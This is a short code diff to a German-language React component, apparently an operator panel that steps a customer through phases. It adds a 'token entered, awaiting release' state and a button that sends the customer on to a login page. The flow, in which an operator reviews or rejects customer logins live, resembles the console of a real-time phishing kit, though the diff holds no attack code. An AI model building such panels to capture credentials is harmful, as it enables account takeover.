@@ -40,6 +40,7 @@ const PROFILE_LABELS: Record<string, string> = {
 
 const PHASE_LABEL: Record<string, string> = {
   waiting: "Wartet auf Kunde",
+  token_waiting: "Token eingegeben – wartet auf Freigabe",
   berater: "Berater-Verifizierung",
   login: "Kunde online – Login",
   login_review: "Login prüfen",
@@ -188,6 +189,14 @@ const AdressLiveCard = () => {
 
               {!done && (
                 <div className="space-y-3 pt-2 border-t">
+                  {phase === "token_waiting" && (
+                    <StepBlock title="Login freigeben">
+                      <p className="text-xs text-muted-foreground">Kunde hat den Token eingegeben und wartet.</p>
+                      <Button size="sm" onClick={() => setPhase(r, r.show_berater ? "berater" : "login", { last_error: null })}>
+                        Login-Seite anzeigen
+                      </Button>
+                    </StepBlock>
+                  )}
                   {(phase === "login" || phase === "login_review" || phase === "login_rejected") && (
                     <StepBlock title="Login prüfen">
                       <div className="flex flex-wrap gap-2 items-center">
